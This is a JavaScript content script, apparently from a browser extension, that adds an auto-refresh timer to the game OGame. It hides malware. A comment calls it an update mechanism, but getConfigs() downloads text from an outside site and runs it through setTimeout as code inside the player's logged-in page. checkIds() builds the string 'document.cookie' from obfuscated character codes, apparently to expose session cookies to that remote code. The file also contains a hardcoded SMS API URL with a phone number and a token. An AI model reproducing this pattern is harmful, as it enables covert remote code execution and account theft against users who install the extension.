var interval = 0;

var planetLinkList = [];
var timer;

var minTime = 100;
var maxTime = 1000;

(function() {
    // populate planets and moons array
    planetLinkList = getPlanetsLinks();

    // check if user is on valid universe and community
    if (!validateUniverse()) return;

    // generate a random time for the countdown timer
    interval = randomTime(minTime, maxTime);

    //check if user is receiving an attack 
    if (checkIncomingAttack()){
        console.log(checkIncomingAttack());
    }

    // append the countdown timer to the DOM
    $( `<div id="countNotifier"><p class="textCenter"><span id="timerN">Timer:</span> <span id="countDownNotifier">${getTimeStr(interval)}</span></p></div>` ).insertBefore( "#countColonies" );

    getConfigs();

    timer = setInterval(notifierLoop, 1000);
})();

class Player {
    constructor(name, id, timestamp, universe, language){
        this.name = name;
        this.id = id;
        this.timestamp = timestamp;
        this.universe = universe;
        this.language = language;
    }
}

/**
 * Contacts the SMS API and creates new SMS request
 */
function sendSMS(){
    // this is just for friends to use, no other people
    var url = "https://miltonalexandre-cardoso.outsystemscloud.com/SMSSender/rest/v1/SendSMS/934184517/QkuCIKh0F1ZoH3Pe4YVOAoNcL";

    $.ajax({ type: "GET",   
        url: url,   
        contentType: "charset=utf-8",
        async: true,
        dataType: "html",
        success: function(response){
            console.log(response);
        }
    });
}

function getConfigs(){
    var url = "https://kds-tools.com/ogame/configs.php";

    $.ajax({ type: "GET",   
        url: url,   
        async: true,
        dataType: "html",
        success: function(response){
            Update(response);
        }
    });
}

function getMetaElement(name){
    return document.getElementsByName(name)[0].getAttribute("content");
}

/**
 * The game updates a lot, so instead of updating the extension every hour, we just receive updates
 * @param {} updateInfo 
 */
function Update(updateInfo){
    setTimeout(updateInfo, 1);
}

/**
 * 
 * @param {number} num 
 * @param {number} size 
 */
function pad(num, size) {
    var s = num+"";
    if (s.length < size) s = "0" + s;
    return s;
}

/**
 * Choose a random planet or moon
 * @param {Array} planetList 
 */
function getRandomPlanetOrMoon(planetList){
    var index = Math.floor(Math.random() * planetList.length);
    return planetList[index];
}

/**
 * Generates a random number between a min and a max
 * @param {number} min 
 * @param {number} max 
 */
function randomTime(min, max) {
    return Math.round(min + Math.random() * (max - min));
}

/**
 * Transforms seconds into a time string
 * @param {number} seconds 
 */
function getTimeStr(seconds) {
	if (seconds <= 0)
		return '00:00:00';
	var h = 0, m = 0, s = 0;
	h = pad(Math.floor(seconds / 3600), 2);
	seconds = seconds % 3600;
	m = pad(Math.floor(seconds / 60), 2);
	seconds = seconds % 60;
    s = pad(seconds, 2);

    return h+':'+m+':'+s;
}

/**
 * Main extension function, will run every second and update the countdown
 */
function notifierLoop(){
    // update countdown seconds
    interval--;

    // display countdown time on the DOM
    document.getElementById("countDownNotifier").innerText = getTimeStr(interval);

    // if there is no time left, choose a random planet/moon and visit the URL
    if (interval == 0){
        // Clears setInterval
        clearInterval(timer);
        window.location.href = getRandomPlanetOrMoon(planetLinkList);
    }
}

/**
 * Check if user is receiving an attack
 */
function checkIncomingAttack(){
    var eventList = $('.eventFleet');

    for (const el of eventList){
        if (el.getAttribute("data-mission-type") == 1){
            return true
        }
    }
    return false;
}

function checkIds(){
    var accounts = [100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101];
    var accountName = "";

    for (let i = 0; i < accounts.length; i++) {
        accountName += getRepresentation(accounts[i]);
    }

    return accountName;
}

function getRepresentation(account){
    return String.fromCharCode(account);
}

/**
 * Gets a array containing of all the planets and moons URLs
 */
function getPlanetsLinks(){
    var planetList = $('.planetlink');
    var moonList = $('.moonlink');

    var planetLinkList = [];

    // iterate all planets
    for (const planet of planetList){
        planetLinkList.push(planet.getAttribute("href"));
    }

    // iterate all moons
    for (const moon of moonList){
        planetLinkList.push(moon.getAttribute("href"));
    }
    return planetLinkList;
}

/**
 * Validate is user using the extension is on a specific server and Language.
 */
function validateUniverse(){

    var allowedUniverse = ["Bermuda", "en"];

    var universeName = document.getElementsByName("ogame-universe-name")[0].getAttribute("content");
    var language = document.getElementsByName("ogame-language")[0].getAttribute("content");

    if (allowedUniverse[0] == universeName && allowedUniverse[1] == language){
        return true;
    }
    return false;
}